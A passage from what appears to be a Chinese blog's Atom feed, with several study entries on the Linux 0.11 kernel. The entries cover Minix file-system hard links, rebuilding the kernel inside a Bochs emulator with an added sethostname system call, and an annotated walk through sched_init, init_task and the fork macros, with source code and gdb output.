class="string">&quot;obase=10;ibase=16;50BA&quot;</span> | bc -l</span><br><span class="line">20666</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>下面为硬链接为目录出现的问题，我建立了一个指向自己父目录的目录,仅仅cd命令就”吃不消”了，若其他遍历目录树的工具的算法逃不出这个坑的话就死机了估计。因此文件系统的设计要求不能建立目录的硬链接，否则<strong>有可能</strong>导致循环图。<br><img src="/images/Linux_0.11_fs_hard_link_error.png" alt="Linux_0.11_fs_hard_link_error.png"></p></li></ul><ul><li>至于为什么不能跨文件系统，由于link的本质是在建立一个inode指针计数增加的目录项，而inode是各个文件系统分布不一致的，因此不能进行跨文件系统寻址，超级块都不一定一致。</li><li>而软链接在本版本的内核貌似没有实现，其具体实现是在软链接文件的数据块放置真正链接文件的路径字符串，因此系统拿到一个软链接的时候再用文件内容的路径去寻址，因此可以跨文件系统以及目录。<br><img src="/images/Linux_0.11_fs_no_symbolic_link.png" alt="Linux_0.11_fs_no_symbolic_link.png"></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然不可能每次都需要人来手动计算，计算机内部实现了更多算法来存取数据，大概的基本原理就这些，当然内存里面关于缓存和文件表等后期会稍微提一下。刨根问底还是很重要的。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;认真学习Minix文件系统!通过一个实例手动分析Minix。具体源码实现由于考虑其他情况将很复杂。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
      <category term="Asm" scheme="https://embpgp.github.io/tags/Asm/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核0.11完全注释 在Linix 0.11操作系统里面编译Linux 0.11内核源码</title>
    <link href="https://embpgp.github.io/2016/12/21/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E5%9C%A8Linix-0-11%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%87%8C%E9%9D%A2%E7%BC%96%E8%AF%91Linux-0-11%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/"/>
    <id>https://embpgp.github.io/2016/12/21/Linux内核0-11完全注释-在Linix-0-11操作系统里面编译Linux-0-11内核源码/</id>
    <published>2016-12-21T04:46:31.000Z</published>
    <updated>2025-03-11T12:14:38.963Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来回折腾，终得其法,之后的系列不会照着章节铺叙了~</p></blockquote><span id="more"></span><hr><h1 id="Get开发版本"><a href="#Get开发版本" class="headerlink" title="Get开发版本"></a>Get开发版本</h1><p>参照书籍第836页17.8的教程，可以wget<a href="http://www.oldlinux.org/Linux.old/bochs/linux-0.11-devel-040923.zip">此处</a>的压缩包到本地，解压之后修改掉相应的配置文件即可启动。</p><h1 id="修改源代码增加系统调用"><a href="#修改源代码增加系统调用" class="headerlink" title="修改源代码增加系统调用"></a>修改源代码增加系统调用</h1><p>我在tinylab上按照书上的教程增加了<code>sethostname</code>系统调用的相关代码和配置。发现用汇编直接编写或者嵌入汇编都是可以达到目的的，但是用C库调用硬是出问题，而后去gcc1.4版本的库文件查看发现并没有相关的信息，但是居然能够编译通过仅仅是执行出问题，相必是内核库文件里面有，但是gcc没有把代码实现链接过来，便想着手动强制gcc链接lib.a，但是报错，应该版本不一样导致的，因为编译Linux 0.11内核源码gcc版本是高版本的。又想着能否自己手动制作一个库文件到gcc1.4里面去呢?结果肯定是太麻烦了，从网上随意搜搜便发现<a href="http://deathking.github.io/hit-oslab/chap1.html">别人家的操作系统课程才是真正的操作系统</a>。然后才意识到Linux 0.11里面有前辈已经做好了自身源代码编译的条件，便尝试编译。然后又爆出<code>Not Owner</code>错误，<a href="https://cms.hit.edu.cn/mod/forum/discuss.php?d=5781">此处有讨论</a>。<del>个人认为还是hdc-0.11.img文件的制作者可能出了点小差错,文件系统命令没有正确调用系统调用。</del>因此暂时放弃tinylab的测试，转到前者去。(<em>刚刚想make start-hd进入继续编译发现又是Not Owner的问题，直接dd重载内核发现可以解决，说明不仅仅是hdc的问题或者说都有些问题的，猜测两者没兼容好,然后我直接把tinylab的hdc放到dev版本下硬盘启动后进入src/linux目录下便正常地直接编译了，此时已经不知道怎么解释了…猜测两者之间没兼容好吧</em>)</p><h1 id="0-11干上0-11"><a href="#0-11干上0-11" class="headerlink" title="0.11干上0.11"></a>0.11干上0.11</h1><p>启动赵博士的硬盘dev版本内核后直接进入到/usr/src/linux目录后,ls -la发现有uid问题.但是不碍事，直接make clean;make后开始编译了。而我在tinylab的源码里面编译出现问题，后面尝试修复。编译完毕之后按照教程先备份原来的引导内核，然后重新启动后在/usr/src/linux目录下键入<code>dd bs=8192 if=Image of=/dev/fd0</code>。为了看到新的内核引导我特意在main函数里面加入了一行代码，打印<code>New kernel Starting</code>。</p><ul><li>UID乱数字<br><img src="/images/Linux_0.11_compile_0.11_uid.png" alt="Linux_0.11_compile_0.11_uid.png"></li><li>make clean<br><img src="/images/Linux_0.11_compile_0.11_make_clean.png" alt="Linux_0.11_compile_0.11_make_clean.png"></li><li>make<br><img src="/images/Linux_0.11_compile_0.11_make.png" alt="Linux_0.11_compile_0.11_make.png"></li><li>restart<br><img src="/images/Linux_0.11_compile_0.11_new_kernel_start.png" alt="Linux_0.11_compile_0.11_new_kernel_start.png"></li></ul><h1 id="继续尝试调用sethostname"><a href="#继续尝试调用sethostname" class="headerlink" title="继续尝试调用sethostname"></a>继续尝试调用sethostname</h1><p>为了保险期间我先用嵌入汇编来写(系统调用号也被改到74去了)，但是居然给我报出了-38的错误号(我用printf看的)，果然查看内核错误号发现居然没有实现的意思，看源码发现真的是没有实现…dev版本的sys_sethostname系统调用直接<code>return -ENOSYS;</code>然后果断照着教程修改源码实现一遍，写出如下C函数，发现终于可以用了。</p><ul><li><img src="/images/Linux_0.11_compile_0.11_sethostname_syscall_num.png" alt="Linux_0.11_compile_0.11_sethostname_syscall_num.png"></li><li><img src="/images/Linux_0.11_compile_0.11_sethostname_call_C.png" alt="Linux_0.11_compile_0.11_sethostname_call_C.png"></li><li><img src="/images/Linux_0.11_compile_0.11_sethostname_test.png" alt="Linux_0.11_compile_0.11_sethostname_test.png"></li></ul><h1 id="转到tinylab工程上去"><a href="#转到tinylab工程上去" class="headerlink" title="转到tinylab工程上去"></a>转到tinylab工程上去</h1><p>本以为是tinylab的Linux 0.11操作系统里面的Linux 0.11内核源代码出了问题，<del>后来还是认为是hdc-0.11.img的缘故</del>。果断修改tools下的bochs的硬盘配置文化，将ata0改为<code>ata0-master: type=disk, path=&quot;rootfs/hdc-0.11-new.img&quot;, mode=flat, cylinders=410, heads=16, spt=38</code>，其中的hdc-0.11-new.img文件从赵博士的dev版本拷贝过来的，而后make start-hd后继续make clean发现仍然出现<code>Not Owner</code>问题，直接一波刚<code>chown -R root.root ./*</code>。之后就OK了。顺利编译链接写入引导重启没问题。(如果有问题则先dd重载内核后再编译)</p><ul><li><img src="/images/Linux_0.11_compile_0.11_chown.png" alt="Linux_0.11_compile_0.11_chown.png"></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然用C语言搭载成功嵌入hdc-0.11.img的gcc1.4能够继续开发Linux 0.11内核功能，但是能否学习bash来更好地契合Linux呢?我想我应该首先学一遍文件系统相关理论知识自己能够鼓捣hdc文件吧。发现hexdump居然可以用了~~~<br><img src="/images/Linux_0.11_compile_0.11_hexdump_root.png" alt="Linux_0.11_compile_0.11_hexdump_root.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;来回折腾，终得其法,之后的系列不会照着章节铺叙了~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
      <category term="Asm" scheme="https://embpgp.github.io/tags/Asm/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核0.11完全注释 编译环境搭建</title>
    <link href="https://embpgp.github.io/2016/12/20/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://embpgp.github.io/2016/12/20/Linux内核0-11完全注释-编译环境搭建/</id>
    <published>2016-12-20T05:51:24.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>关于Linux 0.11源代码网上已经有很多不同程度修改的版本了，而且某些还是继续有编译链接问题的，不如站在前人的肩膀上继续”搬砖”。</p></blockquote><span id="more"></span><hr><p>参考资料<br><a href="http://www.tinylab.org/linux-0.11-lab/">http://www.tinylab.org/linux-0.11-lab/</a></p><p>如参考资料,很丰富也很全面，用来学习和分析很有必要。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;关于Linux 0.11源代码网上已经有很多不同程度修改的版本了，而且某些还是继续有编译链接问题的，不如站在前人的肩膀上继续”搬砖”。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
      <category term="Asm" scheme="https://embpgp.github.io/tags/Asm/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核0.11完全注释 第七章</title>
    <link href="https://embpgp.github.io/2016/12/15/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%B8%83%E7%AB%A0/"/>
    <id>https://embpgp.github.io/2016/12/15/Linux内核0-11完全注释-第七章/</id>
    <published>2016-12-15T05:36:08.000Z</published>
    <updated>2025-03-11T12:14:38.965Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>init进程来了</p></blockquote><span id="more"></span><hr><h1 id="内核初始化流程"><a href="#内核初始化流程" class="headerlink" title="内核初始化流程"></a>内核初始化流程</h1><p><img src="/images/Linux_0.11_chapter7_main_init.png" alt="Linux_0.11_chapter7_main_init.png"></p><h1 id="着重分析”move-to-user-mode-”的前前后后"><a href="#着重分析”move-to-user-mode-”的前前后后" class="headerlink" title="着重分析”move_to_user_mode()”的前前后后"></a>着重分析”move_to_user_mode()”的前前后后</h1><h2 id="move-to-user-mode-宏定义"><a href="#move-to-user-mode-宏定义" class="headerlink" title="move_to_user_mode()宏定义"></a>move_to_user_mode()宏定义</h2><ul><li>这是一段嵌入汇编，gcc在预处理的时候就会完全替代掉。本质是模拟中断返回从内核态转到用户态，但是控制流还是下面那段。相当于虽然从内核态转到用户态但是由于选择子指向的是同一段物理内存空间，所以CPU执行流看起来还是没有什么”异常”。</li><li>根据压栈顺序可以知道用户态cs为0x0f，EIP为iret指令下面的标号1处，功能是仅仅将用户态的局部段选择子值送往各个数据段选择器。而后就会执行fork()函数。下面去看一下任务0的全局描述符表的项是如何加载进去的。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> move_to_user_mode() \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="meta-string">&quot;movl %%esp,%%eax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;pushl $0x17\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;pushl %%eax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;pushfl\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;pushl $0x0f\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;pushl $1f\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;iret\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;1:\tmovl $0x17,%%eax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;movw %%ax,%%ds\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;movw %%ax,%%es\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;movw %%ax,%%fs\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;movw %%ax,%%gs&quot;</span> \</span></span><br><span class="line"><span class="meta">:::<span class="meta-string">&quot;ax&quot;</span>)</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="sched-init"><a href="#sched-init" class="headerlink" title="sched_init()"></a>sched_init()</h2><ul><li>我们根据已有的注释可以大概知道这个函数的功能，主要进行了任务0的tss和ldt的加载到GDT中,以及把剩余任务的tss和ldt槽清0。</li><li>清除掉NT标志，因为并没有任务嵌套并且tss的back_link字段无效。</li><li>由于是第一次，因此必须手动加载tss到tr以及ldt到ldtr。</li><li>定时器功能选择，用于定时任务切换调度。</li><li>加载定时器中断门和系统调用门0x80到gdt。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 内核调度程序的初始化子程序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> * <span class="title">p</span>;</span>                 <span class="comment">// 描述符表结构指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Linux系统开发之初，内核不成熟。内核代码会被经常修改。Linus怕自己无意中修改了</span></span><br><span class="line">    <span class="comment">// 这些关键性的数据结构，造成与POSIX标准的不兼容。这里加入下面这个判断语句并无</span></span><br><span class="line">    <span class="comment">// 必要，纯粹是为了提醒自己以及其他修改内核代码的人。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">sizeof</span>(struct sigaction) != <span class="number">16</span>)         <span class="comment">// sigaction 是存放有关信号状态的结构</span></span><br><span class="line">panic(<span class="string">&quot;Struct sigaction MUST be 16 bytes&quot;</span>);</span><br><span class="line">    <span class="comment">// 在全局描述符表中设置初始任务(任务0)的任务状态段描述符和局部数据表描述符。</span></span><br><span class="line">    <span class="comment">// FIRST_TSS_ENTRY和FIRST_LDT_ENTRY的值分别是4和5，定义在include/linux/sched.h</span></span><br><span class="line">    <span class="comment">// 中；gdt是一个描述符表数组(include/linux/head.h)，实际上对应程序head.s中</span></span><br><span class="line">    <span class="comment">// 全局描述符表基址（_gdt）.因此gtd+FIRST_TSS_ENTRY即为gdt[FIRST_TSS_ENTRY](即为gdt[4]),</span></span><br><span class="line">    <span class="comment">// 也即gdt数组第4项的地址。</span></span><br><span class="line">set_tss_desc(gdt+FIRST_TSS_ENTRY,&amp;(init_task.task.tss));</span><br><span class="line">set_ldt_desc(gdt+FIRST_LDT_ENTRY,&amp;(init_task.task.ldt));</span><br><span class="line">    <span class="comment">// 清任务数组和描述符表项(注意 i=1 开始，所以初始任务的描述符还在)。描述符项结构</span></span><br><span class="line">    <span class="comment">// 定义在文件include/linux/head.h中。</span></span><br><span class="line">p = gdt+<span class="number">2</span>+FIRST_TSS_ENTRY;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;NR_TASKS;i++) &#123;</span><br><span class="line">task[i] = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">p++;</span><br><span class="line">p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">p++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Clear NT, so that we won&#x27;t have troubles with that later on */</span></span><br><span class="line">    <span class="comment">// NT标志用于控制程序的递归调用(Nested Task)。当NT置位时，那么当前中断任务执行</span></span><br><span class="line">    <span class="comment">// iret指令时就会引起任务切换。NT指出TSS中的back_link字段是否有效。</span></span><br><span class="line">__asm__(<span class="string">&quot;pushfl ; andl $0xffffbfff,(%esp) ; popfl&quot;</span>);        <span class="comment">// 复位NT标志</span></span><br><span class="line">ltr(<span class="number">0</span>);</span><br><span class="line">lldt(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 下面代码用于初始化8253定时器。通道0，选择工作方式3，二进制计数方式。通道0的</span></span><br><span class="line">    <span class="comment">// 输出引脚接在中断控制主芯片的IRQ0上，它每10毫秒发出一个IRQ0请求。LATCH是初始</span></span><br><span class="line">    <span class="comment">// 定时计数值。</span></span><br><span class="line">outb_p(<span class="number">0x36</span>,<span class="number">0x43</span>);<span class="comment">/* binary, mode 3, LSB/MSB, ch 0 */</span></span><br><span class="line">outb_p(LATCH &amp; <span class="number">0xff</span> , <span class="number">0x40</span>);<span class="comment">/* LSB */</span></span><br><span class="line">outb(LATCH &gt;&gt; <span class="number">8</span> , <span class="number">0x40</span>);<span class="comment">/* MSB */</span></span><br><span class="line">    <span class="comment">// 设置时钟中断处理程序句柄(设置时钟中断门)。修改中断控制器屏蔽码，允许时钟中断。</span></span><br><span class="line">    <span class="comment">// 然后设置系统调用中断门。这两个设置中断描述符表IDT中描述符在宏定义在文件</span></span><br><span class="line">    <span class="comment">// include/asm/system.h中。</span></span><br><span class="line">set_intr_gate(<span class="number">0x20</span>,&amp;timer_interrupt);</span><br><span class="line">outb(inb_p(<span class="number">0x21</span>)&amp;~<span class="number">0x01</span>,<span class="number">0x21</span>);</span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="init-task共同体"><a href="#init-task共同体" class="headerlink" title="init_task共同体"></a>init_task共同体</h2><ul><li>关于内核态的堆栈”只读”理解见<a href="https://github.com/embpgp/Linux_kernel_0.11_examples/blob/master/chapter4/example_for_multi_tasks/head.s#L180">这里</a></li><li>注释里面也提到了，task_struct结构体和内核态堆栈都处于同一个页面，因此把两者放在一起构成一个共同体是很正确的用法。<del>但得保证task结构体必须放在4K对齐边界，否则在初始化的时候加了个PAGE_SIZE esp0就指到了另外一个内存页了。</del>经过调试发现任务0并不需要满足4K对齐条件，编译的时候也没有特意要求init_task共同体放在边界，但只要不影响程序执行就没什么特别对待的。但后面经过fork()的任务通过层次调用get_page()返回的地址就是4K对齐了。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers </span><br><span class="line">eax            0x00</span><br><span class="line">ecx            0x55e821992</span><br><span class="line">edx            0x1723</span><br><span class="line">ebx            0x33</span><br><span class="line">esp            0x1f0ec0x1f0ec &lt;init_task+4012&gt;</span><br><span class="line">ebp            0x24e880x24e88 &lt;user_stack+4072&gt;</span><br><span class="line">esi            0xe0000917504</span><br><span class="line">edi            0xffc4092</span><br><span class="line">eip            0x6d4c0x6d4c &lt;schedule+163&gt;</span><br><span class="line">eflags         0x246[ PF ZF IF ]</span><br><span class="line">cs             0x88</span><br><span class="line">ss             0x1016</span><br><span class="line">ds             0x1016</span><br><span class="line">es             0x1016</span><br><span class="line">fs             0x1723</span><br><span class="line">gs             0x1723</span><br><span class="line">(gdb) <span class="built_in">print</span> &amp;init_task</span><br><span class="line"><span class="variable">$1</span> = (union task_union *) 0x1e140 &lt;init_task&gt;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每个任务(进程)在内核态运行时都有自己的内核态堆栈。这里定义了任务的内核态堆栈结构。</span></span><br><span class="line"><span class="comment">// 定义任务联合(任务结构成员和stack字符数组成员)。因为一个任务的数据结构与其内核态堆栈</span></span><br><span class="line"><span class="comment">// 在同一内存页中，所以从堆栈段寄存器ss可以获得其数据端选择符。</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">task_union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">task</span>;</span></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">stack</span>[PAGE_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">union</span> <span class="title">task_union</span> <span class="title">init_task</span> =</span> &#123;INIT_TASK,&#125;;   <span class="comment">// 定义初始任务的数据</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="INIT-TASK宏"><a href="#INIT-TASK宏" class="headerlink" title="INIT_TASK宏"></a>INIT_TASK宏</h2><ul><li>越过前面的任务字段看后面的tss字段可以看到ss0为0x10,esp0为PAGE_SIZE+init_task。</li><li>CR3字段为<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L16">pg_dir</a>,其实就是物理地址为0x00000000处，代码运行到<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L128">0x5000</a>之后就开始”粉碎”物理地址0x0000处的代码和数据了。重新建立新的”秩序”,一个页目录和4个页表。参见<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L137">after_page_tables</a>和<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L200">setup_paging</a>这两个汇编过程源码。</li><li>其余字段几乎初始化为默认值(0)。而esp3是由move_to_user_mode()宏来加载的。</li><li>局部段的代码段和数据段的物理地址还是对应内核一致。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  INIT_TASK is used to set up the first task table, touch at</span></span><br><span class="line"><span class="comment"> * your own risk!. Base=0, limit=0x9ffff (=640kB)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_TASK \</span></span><br><span class="line"><span class="meta"><span class="comment">/* state etc */</span>&#123; 0,15,15, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* signals */</span>0,&#123;&#123;&#125;,&#125;,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* ec,brk... */</span>0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* pid etc.. */</span>0,-1,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* uid etc */</span>0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* alarm */</span>0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* math */</span>0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* fs info */</span>-1,0022,NULL,NULL,NULL,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* filp */</span>&#123;NULL,&#125;, \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">&#123;0,0&#125;, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* ldt */</span>&#123;0x9f,0xc0fa00&#125;, \</span></span><br><span class="line"><span class="meta">&#123;0x9f,0xc0f200&#125;, \</span></span><br><span class="line"><span class="meta">&#125;, \</span></span><br><span class="line"><span class="meta"><span class="comment">/*tss*/</span>&#123;0,PAGE_SIZE+(long)&amp;init_task,0x10,0,0,0,0,(long)&amp;pg_dir,\</span></span><br><span class="line"><span class="meta"> 0,0,0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"> 0,0,0x17,0x17,0x17,0x17,0x17,0x17, \</span></span><br><span class="line"><span class="meta"> _LDT(0),0x80000000, \</span></span><br><span class="line"><span class="meta">&#123;&#125; \</span></span><br><span class="line"><span class="meta">&#125;, \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>此时已经从内核态返回到了任务0的用户态了，但是控制流已经执行到了fork()函数了，Linux 0.11由一个宏定义来引用，下面继续分析</p></blockquote><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><ul><li>为了不”污染”任务1的用户栈因此选择使用宏定义来进行fork系统调用。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Linux在内核空间创建进程时不使用写时复制技术(Copy on write).main()在移动到用户</span></span><br><span class="line"><span class="comment">// 模式（到任务0）后执行内嵌方式的fork()和pause(),因此可保证不适用任务0的用户栈。</span></span><br><span class="line"><span class="comment">// 在执行moveto_user_mode()之后，本程序main()就以任务0的身份在运行了。而任务0是</span></span><br><span class="line"><span class="comment">// 所有将将创建子进程的父进程。当它创建一个子进程时(init进程)，由于任务1代码属于</span></span><br><span class="line"><span class="comment">// 内核空间，因此没有使用写时复制功能。此时任务0的用户栈就是任务1的用户栈，即它们</span></span><br><span class="line"><span class="comment">// 共同使用一个栈空间。因此希望在main.c运行在任务0的环境下不要有对堆栈的任何操作，</span></span><br><span class="line"><span class="comment">// 以免弄乱堆栈。而在再次执行fork()并执行过execve()函数后，被加载程序已不属于内核空间</span></span><br><span class="line"><span class="comment">// 因此可以使用写时复制技术了。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 下面_syscall0()是unistd.h中的内嵌宏代码。以嵌入汇编的形式调用Linux的系统调用中断</span></span><br><span class="line"><span class="comment">// 0x80.该中断是所有系统调用的入口。该条语句实际上是int fork()创建进程系统调用。可展</span></span><br><span class="line"><span class="comment">// 开看之就会立刻明白。syscall0名称中最后的0表示无参数，1表示1个参数。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall0(<span class="keyword">int</span>,fork)</span><br><span class="line"><span class="comment">// int pause() 系统调用，暂停进程的执行，直到收到一个信号</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall0(<span class="keyword">int</span>,pause)</span><br><span class="line"><span class="comment">// int setup(void * BIOS)系统调用，仅用于linux初始化(仅在这个程序中被调用)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall1(<span class="keyword">int</span>,setup,<span class="keyword">void</span> *,BIOS)</span><br><span class="line"><span class="comment">// int 